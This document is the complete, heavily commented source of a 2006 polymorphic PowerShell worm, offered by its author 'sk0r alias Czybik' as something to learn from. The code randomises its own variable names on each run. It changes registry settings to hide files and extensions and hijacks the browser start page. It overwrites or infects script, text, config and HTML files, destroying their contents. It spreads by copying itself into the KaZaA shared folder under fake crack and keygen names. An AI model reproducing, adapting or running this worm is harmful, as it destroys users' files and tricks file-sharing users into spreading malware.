<?
############################################################################
#                                                                          #
# sk0r alias Czybik PowerShell Variable Poly Worm                          #
# ===============================================                          #
#                                                                          #
# About how to contact sk0r alias Czybik:                                  #
# -----------------------------------------                                #
# Email-Address: sk0r1337@gmx.de                                           #
# Homepages: www.sk0r-scripts.tk - www.sk0r-virii.tk - www.czybik-kit.tk   #
# Irc-Channel: #vx-lab or #vxers @ undernet                                #
#                                                                          #
# Informations about this worm :                                           #
# ------------------------------                                           #
# This is the first PowerShell Worm which changes it                       #
# variable names everytime the worm runs.                                  #
# The worm uses the two Objects (WScript.Shell							   #
# and Scripting.FileSystemObject )                                         #
# So this worm does the followthing explained shortly:                     # 
# - Spreads per P2P Client KaZaA Lite                                      #
# - Modifies some Registry values                                          #
# - Change specific variables in the code in an array                      #
# - Overwrites .msh, .bat, .cmd, .log, .ini, .txt, .ps1, .js or .html files#
# - overwritten .msh or .ps1 files have our source at first and the file   #
#	source at second place. the other files listed above will be           #
#	overwritten. the extension will be changed to .msh                     #
# - The payload, a info message, will appear if the time is greater        #
#   then 17:00:00. It will show informations                               #
#                                                                          #
# Structure of the worm:                                                   #
# -----------------------                                                  #
#    [Code]                                                                #
#    'explanation                                                          #
#                                                                          #
# Note: Sorry about my bad english                                         #
#       If I would explain this in german everybody would understand       #
#       better. But I decided to comment the worm in english, because      #
#       everybody who codes in PowerShell can read and learn 			   #
#		form this worm. I needed some days do made this worm. because I    #
#		had no tutorials I had to find out the most commands myself.       #
#		So please email me, what you think of this worm                    #                  
#                                                                          #
############################################################################

# <!-- StartCode -->



$fso = New-Object -Com Scripting.FileSystemObject ;
$sysdir = $fso.GetSpecialFolder(1) ;
$wshs = New-Object -Com WScript.Shell ;
$ArrayVars = ("fso","wshs","ArrayVars","sysdir","gtFileSize","AllMshDateinCurDir","KazaaDir","gtMySelfToCopy","NormalName",
"intHomepage","strHomepage","PowerShellScript","MySelfWorm","ContentOfMyWorm","StringsToPoly","PolymorphicPowerShell","EndName",
"gtFilesToInfect","InfectAllFilesNow","gtCurrentDate","intRandomNumb","AscString","VictimDateien","gtvicpscon","gtvicmshcon") ;
$gtFileSize = 14370 ;
$AllMshDateinCurDir = get-childitem *.msh ;

# here we declare five variables. $fso creates the 
# Scripting.FileSystemObject. the $wshs creates 
# the WScript.Shell Object. The Variable $ArrayVars
# contains all variable names we want to change by each run
# $gtFileSize contains the file size as integer
# $AllMshDateinCurDir contains all msh files in current direcory
# =======================================================



$intHomepage = (new-object Random).Next(1*3)
if ($intHomepage -eq 0)
{
	$strHomepage = "http://www.sk0r-scripts.tk";
}
elseif ($intHomepage -eq 1)
{
	$strHomepage = "http://www.sk0r-virii.tk";
}
elseif ($intHomepage -eq 2)
{
	$strHomepage = "http://www.czybik-kit.tk";
}

# Here we create a random number from 1 till 3.
# for each value the variable $strHomepages
# contains a other homepage address
# ===========================================



$wshs.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 0, "REG_DWORD"); 
$wshs.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD"); 
$wshs.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "Infected Poly","REG_SZ"); 
$wshs.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "sk0rCzybik","REG_SZ"); 
$wshs.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "Infected by a poly ps worm","REG_SZ"); 
$wshs.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "$strHomepage")

# Here we write some registry values to the
# system registry. Our homepage address will
# be adden, too. After changing the values the
# user cant see hidden files and file extensions.
# the registered organisation will be changed to
# Infected Poly, the registered owner will be changed
# to sk0rCzybik and the Title of the internet explorer
# will be changed to Infected by a poly ps worm



foreach ($PowerShellScript in $AllMshDateinCurDir)
{
  if ($PowerShellScript.Length=$gtFileSize)
  {
    $MySelfWorm = $PowerShellScript.Name;
  }
}

# this loop checks all msh files in the current directory
# if a files exists with our searched file size, the 
# variable $MySelfWorm contains the path and the name
# to our worm
# ===================================================



$opnMyForRead = $fso.OpenTextFile($MySelfWorm,1) ;
$ContentOfMyWorm = $opnMyForRead.ReadAll() ;
$opnMyForRead.Close() ;

# Here we open the worm (the file itself) for reading.
# the whole worm content will be contented by the
# variable $ContentOfMyWorm. After that
# we close our worm (the file itself).
# ====================================



$gtFilesToInfect = get-childitem *.*
foreach ($VictimDateien in $gtFilesToInfect)
{
	foreach ($StringsToPoly in $ArrayVars)
	{
		for ($i = 0; $i -le $StringsToPoly.length; $i++)
		{
			$intRandomNumb = (new-object Random).next(1*27) ;
			if ($intRandomNumb -eq 0)
			{
				$AscString = $AscString + "a";
			}
			elseif ($intRandomNumb -ne 0)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 1)
			{
				$AscString = $AscString + "b";
			}
			elseif ($intRandomNumb -ne 1)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 3)
			{
				$AscString = $AscString + "c";
			}
			elseif ($intRandomNumb -ne 3)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 4)
			{
				$AscString = $AscString + "d";
			}
			elseif ($intRandomNumb -ne 4)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 5)
			{
				$AscString = $AscString + "e";
			}
			elseif ($intRandomNumb -ne 5)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 6)
			{
				$AscString = $AscString + "f";
			}
			elseif ($intRandomNumb -ne 6)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 7)
			{
				$AscString = $AscString + "g";
			}
			elseif ($intRandomNumb -ne 7)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 8)
			{
				$AscString = $AscString + "h";
			}
			elseif ($intRandomNumb -ne 8)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 9)
			{
				$AscString = $AscString + "i";
			}
			elseif ($intRandomNumb -ne 9)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 10)
			{
				$AscString = $AscString + "j";
			}
			elseif ($intRandomNumb -ne 10)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 11)
			{
				$AscString = $AscString + "k";
			}
			elseif ($intRandomNumb -ne 11)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 12)
			{
				$AscString = $AscString + "l";
			}
			elseif ($intRandomNumb -ne 12)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 13)
			{
				$AscString = $AscString + "m";
			}
			elseif ($intRandomNumb -ne 13)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 14)
			{
				$AscString = $AscString + "n";
			}
			elseif ($intRandomNumb -ne 14)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 15)
			{
				$AscString = $AscString + "o";
			}
			elseif ($intRandomNumb -ne 15)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 16)
			{
				$AscString = $AscString + "p";
			}
			elseif ($intRandomNumb -ne 16)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 17)
			{
				$AscString = $AscString + "q";
			}
			elseif ($intRandomNumb -ne 17)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 18)
			{
				$AscString = $AscString + "r";
			}
			elseif ($intRandomNumb -ne 18)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 19)
			{
				$AscString = $AscString + "s";
			}
			elseif ($intRandomNumb -ne 19)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 20)
			{
				$AscString = $AscString + "t";
			}
			elseif ($intRandomNumb -ne 20)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 21)
			{
				$AscString = $AscString + "u";
			}
			elseif ($intRandomNumb -ne 21)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 22)
			{
				$AscString = $AscString + "v";
			}
			elseif ($intRandomNumb -ne 22)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 23)
			{
				$AscString = $AscString + "w";
			}
			elseif ($intRandomNumb -ne 23)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 24)
			{
				$AscString = $AscString + "x";
			}
			elseif ($intRandomNumb -ne 24)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 25)
			{
				$AscString = $AscString + "y";
			}
			elseif ($intRandomNumb -ne 25)
			{
				$AscString = $AscString + "";
			}
			if ($intRandomNumb -eq 26)
			{
				$AscString = $AscString + "z";
			}
			elseif ($intRandomNumb -ne 26)
			{
				$AscString = $AscString + "";
			}
		}
		$ContentOfMyWorm = $ContentOfMyWorm.replace($StringsToPoly,$AscString);
		Remove-Variable AscString
	}
	if ($VictimDateien = "msh")
	{
		$gtvicmshcon = get-content $VictimDateien.name ;
		if ($gtvicmshcon[517] -ne "#sk0r alias Czybik")
		{
			del $VictimDateien.name ;
			echo $ContentOfMyWorm >> $VictimDateien.name ;
			echo $gtvicmshcon >> $VictimDateien.name ;
		}
	}
	if ($VictimDateien = "ps1")
	{
		$gtvicpscon = get-content $VictimDateien.name ;
		if ($gtvicpscon[517] -ne "#sk0r alias Czybik")
		{
			del $VictimDateien.name ;
			echo $ContentOfMyWorm >> $VictimDateien.name ;
			echo $gtvicpscon >> $VictimDateien.name ;
		}
	}
	if ($VictimDateien = "bat")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
	if ($VictimDateien = "cmd")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
	if ($VictimDateien = "log")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
	if ($VictimDateien = "ini")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
	if ($VictimDateien = "txt")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
	if ($VictimDateien = "js")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
	if ($VictimDateien = "html")
	{
		$NormalName = $gtFilesToInfect.name ;
		$EndName = $NormalName+".msh" ;
		del VictimDateien.name ;
		echo $ContentOfMyWorm >> VictimDateien.name ;
		rename-item "$gtFilesToInfect" $EndName ;
	}
}

# Ok, hope I can explain this in english so you can understand :-D
# The variable $gtFilesToInfect contains all files in the current
# directory. and for each file in the directory
# the for each string in the variable $ArrayVars a loop appears for
# each char in a string. for each char a random number will be created
# if the random number has a specific value the variable $AscString
# contains a specific char. The If Statement is arranged alphabetically.
# If all chars are looped, the string will be replaced with the new random
# string. This happens for all strings in the $ArrayVars Variable. For each
# string we need do delete the variable $AscString otherwise a new 
# variable name is too long and a it adds each string to the next string.
# In the End the variable $ContentOfMyWorm contains the new
# Souce-Code with the new variable names.
# then wee look if msh or ps1 files exists in our direcory.
# if this is true we look if the file is infected. If not then
# we write our worm source at the first place and then write
# the normal source of the file at second place.
# Then we look if .bat, .cmd, .log, .ini, .txt, .js or .html files
# exists in our folder. If this is true, our worm overwrites the
# the file and changes the extension to .msh
# ==============================================================



$crtTheNewWorm = $fso.CreateTextFile("$sysdir\sk0rCzybik.msh");
$crtTheNewWorm.Write($ContentOfMyWorm);
$crtTheNewWorm.Close();

# Here a new msh file with the new worm content will be created.
# =====================================================



$gtMySelfToCopy = $fso.getfile("$sysdir\sk0rCzybik.msh");
$KazaaDir = $wshs.RegRead('HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DownloadDir'); 
if ($KazaaDir -ne "")
{
	$gtMySelfToCopy = $fso.getfile($MySelfWorm)
	$gtMySelfToCopy.copy("$KazaaDir\Microsoft Windows Vista Cd-Key.txt.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Windows Vista Update.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Ad-aware SE Personal Edition 1.06r1.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Ashampoo Media Player 2.03 install.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Allround WinZIP Key Generator.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Talisman Desktop 2.99 Crack.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Nero Burning Rom 6.6.0.13 Crack.msh"); 
	$gtMySelfToCopy.copy("$KazaaDir\Kaspersky KeyGen working.msh");
	$gtMySelfToCopy.copy("$KazaaDir\Daemon Tools Install + Crack.rar.msh");
	$gtMySelfToCopy.copy("$KazaaDir\AVP - AntiVirus Key Generator.msh");
}

# Here the variable Kazaa dir reads a registry key, which contains the
# path to the My Shared Folder path. If it exists the worm copys
# itself as some filenames in the My Shared Folder Directory.
# ===========================================================



$gtCurrentDate = get-date -DisplayHint time
if ($gtCurrentDate -gt "17:00:00")
{
	$wshs.popup("This is the first polymorphic PowerShell Worm.
	This Worm was written by sk0r alias Czybik.
	This Worm is �2006 by sk0r alias Czybik
	To ask some questions email me @ sk0r1337@gmx.de
	www.sk0r-scripts.tk - www.sk0r-virii.tk - www.czybik-kit.tk ",10,"PowerShell Polymorphic Worm �2006 by sk0r alias Czybik");
}

# the Variable gtCurrentDate uses the function get-date with parameter time 
# to get the current time. If the time is greater the 17:00:00 a popup
# message will appear.
# ==================================================================



exit ;

# This command exits the script
# ====================



# <!-- End Code -->

# This Worm is �2006 by sk0r alias Czybik.  

#sk0r alias Czybik